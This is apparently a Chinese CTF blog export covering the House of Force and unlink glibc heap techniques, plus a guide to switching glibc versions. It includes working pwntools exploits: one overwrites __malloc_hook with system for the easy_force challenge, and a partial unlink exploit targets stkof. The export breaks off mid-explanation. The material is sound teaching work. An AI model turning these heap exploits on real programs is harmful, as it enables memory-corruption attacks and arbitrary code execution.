    <content><![CDATA[<h1 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><strong>利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。</strong></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line"><span class="comment">//nb是用户申请的堆块的大小加上头堆块 </span></span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    <span class="comment">// 新的top chunk的大小</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb)；</span><br><span class="line">    <span class="comment">//等价于remainder = (mchunkptr)((char*)victim + nb); 获取新的top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    <span class="comment">//更新top chunk地址</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>只要满足把top chunk的size改成一个很大的值，就可以通过这个检测。</p>
<p>一般把top chunk size的值改为-1 size是unsigned int类型就会变成0xffffffffffffffff  从而绕过检测。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(offset);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的offset就是想控制top chunk移动后的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = target - <span class="number">0x10</span> <span class="comment">//nb</span></span><br><span class="line">       -=top </span><br><span class="line">    </span><br><span class="line"><span class="built_in">malloc</span>(offset) <span class="comment">// 此时new top chunk的头地址就会位于 target-0x10的位置</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>) <span class="comment">//实现任意地址写    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里<code>offset</code>也可以是负数 （控制<code>topchunk</code>向低地址偏移）</p>
<ul>
<li><p>由于我们的<code>top chunk size</code>是-1 所以可以绕过检测。</p>
</li>
<li><p><code>new top chunk</code>的size我们不需要关系 重要的是<code>new top chunk</code>的地址 ,也就是：</p>
<p><code>remainder = chunk_at_offset(victim, nb):</code></p>
<p>这里我们的nb是一个负数  虽然转化成unsigned int类型会变成一个很大的正数 但是计算的时候会经过处理变成正常的加减法 就把他当成正常负数看就好。</p>
</li>
</ul>
<h2 id="例题：2023-羊城杯决赛easy-force"><a href="#例题：2023-羊城杯决赛easy-force" class="headerlink" title="例题：2023 羊城杯决赛easy_force"></a>例题：2023 羊城杯决赛easy_force</h2><h3 id="main："><a href="#main：" class="headerlink" title="main："></a><strong>main：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png" alt="image-20251127122736424"></p>
<h3 id="add"><a href="#add" class="headerlink" title="add:"></a><strong>add:</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png" alt="image-20251127122801609"></p>
<h3 id="保护："><a href="#保护：" class="headerlink" title="保护："></a><strong>保护：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png" alt="image-20251127123220721"></p>
<p>这里只给了4次add函数的机会 ， 其他的函数都无用。</p>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><p>通过house of force 把 malloc_hook 改成 system(\bin\sh)。</p>
<h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h3><h4 id="首先通过mmap泄露libc基地址："><a href="#首先通过mmap泄露libc基地址：" class="headerlink" title="首先通过mmap泄露libc基地址："></a>首先通过<code>mmap</code>泄露<code>libc</code>基地址：</h4><p>在处理大 chunk 时的行为：<br>glibc 的 <code>malloc</code> 对于大于<code> mmap_threshold</code> 的申请，不使用 heap，而是直接调用 mmap() 向内核申请一块内存。<br>默认情况下，这个阈值在 128 KB 左右（也可能是更大）<br>(比如：<code>malloc(0x20000)</code> ➜ 会使用 <code>mmap</code>)</p>
<p><code>mmap </code>分配的大 <code>chunk</code> 地址规律：</p>
<p>使用<code>mmap()</code>分配的内存块，一般在 libc 映射地址之下；<br>在默认的内存布局中，<code>mmap()</code> 返回的地址和 libc.so 的加载基址存在一个固定偏移；</p>
<p>申请一个超大 chunk（触发 <code>mmap</code>）<br>打印这个 chunk 的地址<br>减去偏移,得到 libc base</p>
<p>这个偏移值是固定的（取决于特定 libc 版本的布局），你只要知道 libc 版本，就可以知道偏移量。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libc.address= <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png" alt="Image #1"></p>
<h4 id="修改topchunk-size"><a href="#修改topchunk-size" class="headerlink" title="修改topchunk  size:"></a>修改<code>topchunk</code>  size:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png" alt="image-20251127125636159"></p>
<h4 id="计算偏移移动top-chunk到新位置"><a href="#计算偏移移动top-chunk到新位置" class="headerlink" title="计算偏移移动top chunk到新位置:"></a>计算偏移移动<code>top chunk</code>到新位置:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">// <span class="number">0x20</span>的偏移通过调试获得</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png" alt="image-20251127125941799"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png" alt="image-20251127125952099"></p>
<p>这里可以看到new top 被移动到了malloc_hook - 0x10的位置。</p>
<p>这样我们就可以进行任意地址写 覆写malloc_hook的地址了</p>
<h4 id="写入system："><a href="#写入system：" class="headerlink" title="写入system："></a>写入system：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以看到<code>new topchunk</code> 切割了一块0x20大小的堆块给返回给用户</p>
<p>我们从这里写入了system的地址</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png" alt="image-20251127130158802"></p>
<p>后面再次利用malloc函数就可以实现打通。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;now what to write?\n&quot;</span>,content)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libcc = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc.address= libcc +<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libcc))</span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system :&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>house of force 的关键在于可以修改<code>topchunk</code>的size部分 以及 计算好到target目标地址的偏移量。</p>
<p>参考：<a href="https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/index.html">https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem(&#39;bin%20sh&#39;))/index.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc 版本</title>
    <url>/2025/09/25/%E6%9B%B4%E6%8D%A2glibc/</url>
    <content><![CDATA[<h1 id="更换glibc版本"><a href="#更换glibc版本" class="headerlink" title="更换glibc版本"></a>更换glibc版本</h1><h2 id="1-下载glibc-all-in-one"><a href="#1-下载glibc-all-in-one" class="headerlink" title="1.下载glibc_all_in_one"></a>1.下载glibc_all_in_one</h2><p>步骤 1：安装依赖工具 </p>
<p>bash: sudo apt install patchelf git </p>
<p>步骤 2：下载 glibc-all-in-one </p>
<p>bash: git clone <a href="https://github.com/matrix1001/glibc-all-in-one.git">https://github.com/matrix1001/glibc-all-in-one.git</a> </p>
<p>cd glibc-all-in-one</p>
<h2 id="2-下载对应版本的glibc-2-23为例"><a href="#2-下载对应版本的glibc-2-23为例" class="headerlink" title="2.下载对应版本的glibc(2.23为例)"></a>2.下载对应版本的glibc(2.23为例)</h2><p>.&#x2F;update_list</p>
<p>cat list | grep 2.23</p>
<p>.&#x2F;download 2.23-0ubuntu3_amd64</p>
<p><strong>问题</strong>：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165210090.png" alt="image-20250725165210090"></p>
<p>出现<code>sudo: unable to execute ./update_list: No such file or directory</code>错误，看似矛盾（<code>ls</code>明明显示文件存在），实际是因为<code>update_list</code>脚本的<strong>解释器路径无效</strong>或脚本本身存在损坏。具体解决步骤如下：</p>
<p>1.检查<code>update_list</code>脚本的头部解释器</p>
<p># 查看脚本首行 head -n 1 .&#x2F;update_list</p>
<p>正常输出应为：</p>
<p>#!&#x2F;bin&#x2F;bash</p>
<h2 id="3-更换"><a href="#3-更换" class="headerlink" title="3.更换"></a>3.更换</h2><p>❯ patchelf –set-interpreter &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F;ld-2.23.so <br>         –set-rpath &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F; <br>         .&#x2F;pwn160</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165549637.png" alt="image-20250725165549637"></p>
<p>注意路径！！！</p>
<h2 id="4-检查"><a href="#4-检查" class="headerlink" title="4.检查"></a>4.检查</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165853663.png" alt="image-20250725165853663"></p>
<h2 id="5-换回去"><a href="#5-换回去" class="headerlink" title="5.换回去"></a>5.换回去</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725170102584.png" alt="image-20250725170102584"></p>
<p>1.patchelf –remove-rpath .&#x2F;hacknote  </p>
<p>清除之前通过<code>--set-rpath</code>指定的 glibc 库路径</p>
<p>2.patchelf –set-interpreter &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-linux.so.2 .&#x2F;hacknote</p>
<p>恢复系统默认的动态链接器</p>
<p>64 位程序的默认链接器是<code>/lib64/ld-linux-x86-64.so.2</code>，但 32 位程序必须使用 32 位链接器<code>/lib/i386-linux-gnu/ld-linux.so.2</code>（若路径不同，可通过<code>dpkg -L libc6:i386 | grep ld-linux</code>查询）。</p>
<h1 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h1><h2 id="编译不同版本的glibc"><a href="#编译不同版本的glibc" class="headerlink" title="编译不同版本的glibc"></a>编译不同版本的glibc</h2><p>首先要使用不同版本的glibc，我们需要有不同版本的 glibc 可执行文件，也就是 libc.so 和 ld.so。这两个文件是程序运行时所需要的文件按。</p>
<p>当然也可以在网上找已经编译好的libc，但是找不到时自己编译的步骤如下：</p>
<p>glibc-all-in-one：是一个开源项目，里面有各种版本的glibc 源码。</p>
<p>然后编译glibc 的命令如下：</p>
<p>git clone <a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<p>cd glibc-all-in-one</p>
<p>chmod 777 build download extract</p>
<p>sudo .&#x2F;build 2.29 amd64     #编译glibc<br>sudo .&#x2F;build 2.27 amd64<br>sudo .&#x2F;build 2.23 amd64</p>
<h2 id="加载glibc"><a href="#加载glibc" class="headerlink" title="加载glibc"></a>加载glibc</h2><p>对于一个可执行文件，可以通过 LD_PRELOAD 来指定其使用 对应版本的 glibc。但是这里需要注意，还得指定一个对应版本的 ld.so，不然 可能会出现问题。</p>
<p>使用方法如下，我习惯将 ld.so 和 libc.so.6 放到与程序同目录下。也可以自己改变路径。</p>
<p>p &#x3D; process([“ld.so”, “.&#x2F;test”],<br>            env&#x3D;{“LD_PRELOAD”:”libc.so.6”})<br>通过上面的操作，我们就可以指定 test 加载对应版本的 glibc。</p>
<h2 id="更换动态链接库"><a href="#更换动态链接库" class="headerlink" title="更换动态链接库"></a>更换动态链接库</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201153641147.png" alt="image-20251201153641147"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink</title>
    <url>/2025/12/01/unlink/</url>
    <content><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>在执行_int_free()函数的时候会执行unlink:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>chunk1 free进入unsortedbin 的时候，如果相邻地址的chunk的chunk2处于空闲状态：</p>
<p><strong>unlink会将chunk1和chunk2进行合并操作，而chunk2的fd和bk位置对应的地址就会进行unlink也就是断链操作。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">         <span class="type">long</span> *hollk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         </span><br><span class="line">         <span class="built_in">free</span>(first_chunk);</span><br><span class="line">         <span class="built_in">free</span>(second_chunk);</span><br><span class="line">         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>全部free完成后的情况：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212019654.png" alt="image-20251201212019654"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212106544.png" alt="image-20251201212106544"></p>
<p>注：0x440是<code>chunk2</code>    0x669是<code>chunk1</code>    0x9a2是<code>chunk3</code> 0x4d0是<code>chunk4</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230538872.png" alt="image-20251201230538872"></p>
<p>这里在进行free（Chunk4）的时候 由于chunk2与chunk4相邻就会合并chunk2 而chunk1和chunk3的bk 和 fd就会进行Unlink:</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225847125.png" alt="image-20251201225847125"></p>
<p>但是还需要绕过一下三个<strong>检测</strong>：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225936936.png" alt="image-20251201225936936"></p>
<ol>
<li><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p>
<p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）</p>
</li>
<li><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p>
<p>可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p>
</li>
<li><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p>
<p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址。</p>
</li>
</ol>
<h2 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h2><h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214023872.png" alt="image-20251201214023872"></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214134444.png" alt="image-20251201214134444"></p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214139392.png" alt="image-20251201214139392"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214644090.png" alt="image-20251201214644090"></p>
<p>创立的chunk 只需要管后两个堆块</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214657971.png" alt="image-20251201214657971"></p>
<p>存储heap的数组n</p>
<p>下面讲解一下unlink的部分：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) </span><br><span class="line">pay +=p64(<span class="number">0x602138</span>) + p64(<span class="number">0x602140</span>)</span><br><span class="line">pay +=p64(<span class="number">0x20</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pay += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>unlink的目的是控制数组n 实现任意地址写：</p>
<p>利用edit伪造了一个已经free掉进入unsortedbin中的chunk 然后free(chunk3)的时候触发unlink 实现了修改chunk3 fd的目的。</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230227275.png" alt="image-20251201230227275"></p>
<p>fake chunk:</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215704590.png" alt="image-20251201215704590"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230159757.png" alt="image-20251201230159757"></p>
<p>可以看到绕过了上述的检测。</p>
<p>这里看一下伪造的fd 和 bk 也就是chunk3和chunk2：</p>
<p>这两个伪造的堆块位于数组n</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215923846.png" alt="image-20251201215923846"></p>
<p>38的bk和40的fd都指向我们伪造的fake chunk </p>
<p>然后free chunk3（与fake chunk地址相邻）后：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230126886.png" alt="image-20251201230126886"></p>
<p>① fake_chunk被摘除之后首先执行的就是first_bk &#x3D; third_addr，也就是说first_chunk的bk由原来指向fake_chunk地址更改成指向third_chunk地址：</p>
